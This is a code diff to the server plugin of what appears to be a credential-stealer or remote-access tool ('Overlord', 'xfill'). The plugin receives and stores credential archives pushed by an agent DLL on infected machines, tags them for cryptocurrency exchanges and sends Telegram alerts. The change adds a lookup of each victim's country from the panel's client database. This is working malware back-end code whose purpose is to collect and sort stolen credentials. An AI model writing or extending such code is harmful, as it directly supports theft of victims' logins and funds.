@@ -1,11 +1,37 @@
 import fs from "fs";
 import path from "path";
 import zlib from "node:zlib";
+import { Database } from "bun:sqlite";
 
 /* ──────────────────────────────────────────────
    xfill server plugin — receive/reassemble/store
    credential archives pushed by the agent DLL.
    ────────────────────────────────────────────── */
+
+// Read-only handle on the main Overlord DB so archive Country matches what the
+// client card shows (the server geo-locates the client IP on connect).
+let mainDb = null;
+function getMainDb() {
+  if (mainDb) return mainDb;
+  try {
+    const dir = String(process.env.DATA_DIR || "").trim() || "./data";
+    mainDb = new Database(path.join(dir, "overlord.db"), { readonly: true, create: false });
+  } catch {}
+  return mainDb;
+}
+
+/// Country the Overlord client card shows for this client ("ZZ" = unknown).
+function clientCountry(clientId) {
+  try {
+    const db = getMainDb();
+    if (!db) return "";
+    const row = db.prepare("SELECT country FROM clients WHERE id = ?").get(String(clientId));
+    const c = String(row?.country || "").trim().toUpperCase();
+    return c && c !== "ZZ" && c.length === 2 ? c : "";
+  } catch {
+    return "";
+  }
+}
 
 // In-memory chunk reassembly buffers keyed by `${clientId}:${session}`
 const pending = new Map();
@@ -276,7 +302,7 @@ async function storeSessionArchive(ctx, clientId, session, payload, partial) {
   fs.mkdirSync(path.dirname(target), { recursive: true });
   fs.writeFileSync(target, zip);
 
-  const info = await enrichCountry(ctx, payload?.info ?? null);
+  const info = await enrichCountry(ctx, payload?.info ?? null, clientId);
   if (info && typeof info === "object") {
     const prior = ctx.db
       .prepare("SELECT COUNT(*) AS n FROM archives WHERE client_id = ?")
@@ -440,7 +466,7 @@ async function finalizeSession(ctx, clientId, session) {
     fs.writeFileSync(target, zip);
 
     // Fill in Country via GeoIP when the agent couldn't resolve it.
-    const info = await enrichCountry(ctx, payload?.info ?? null);
+    const info = await enrichCountry(ctx, payload?.info ?? null, clientId);
     // FirstTime = this client has never delivered an archive before.
     const prior = ctx.db
       .prepare("SELECT COUNT(*) AS n FROM archives WHERE client_id = ?")
@@ -748,9 +774,17 @@ async function sendTelegramNotification(ctx, info, zip, zipName) {
   }
 }
 
-/// Best-effort GeoIP enrichment when the agent left Country empty.
-async function enrichCountry(ctx, info) {
-  if (!info || info.Country || !info.IpAddress) return info;
+/// Fill info.Country when the DLL left it empty. Prefers the country the
+/// Overlord client card already shows (server-side GeoIP of the client IP,
+/// stored in the main DB); falls back to ip-api.com for unknown clients.
+async function enrichCountry(ctx, info, clientId) {
+  if (!info || info.Country) return info;
+  const known = clientId ? clientCountry(clientId) : "";
+  if (known) {
+    info.Country = known;
+    return info;
+  }
+  if (!info.IpAddress) return info;
   try {
     const res = await fetch(`https://ip-api.com/json/${encodeURIComponent(info.IpAddress)}?fields=status,countryCode`, {
       signal: AbortSignal.timeout(4000),
@@ -1076,7 +1110,8 @@ export default {
     },
 
     /// Recompute tags for every stored archive (backfills badges for logs
-    /// ingested before tagging existed). Also backfills the exchanges column.
+    /// ingested before tagging existed). Also backfills the exchanges column
+    /// and the Country field from the server's client record.
     rescanTags(ctx) {
       const rows = ctx.db.prepare("SELECT * FROM archives").all();
       let updated = 0;
@@ -1088,7 +1123,15 @@ export default {
             info = JSON.parse(row.info_json);
           } catch {}
           const { tags, exchanges } = computeTags(zip.buf, info);
-          ctx.db.prepare("UPDATE archives SET tags = ?, exchanges = ? WHERE id = ?").run(JSON.stringify(tags), JSON.stringify(exchanges), row.id);
+          let infoJson = row.info_json;
+          if (info && typeof info === "object" && !info.Country) {
+            const c = clientCountry(row.client_id);
+            if (c) {
+              info.Country = c;
+              infoJson = JSON.stringify(info);
+            }
+          }
+          ctx.db.prepare("UPDATE archives SET tags = ?, exchanges = ?, info_json = ? WHERE id = ?").run(JSON.stringify(tags), JSON.stringify(exchanges), infoJson, row.id);
           updated++;
         } catch {}
       }
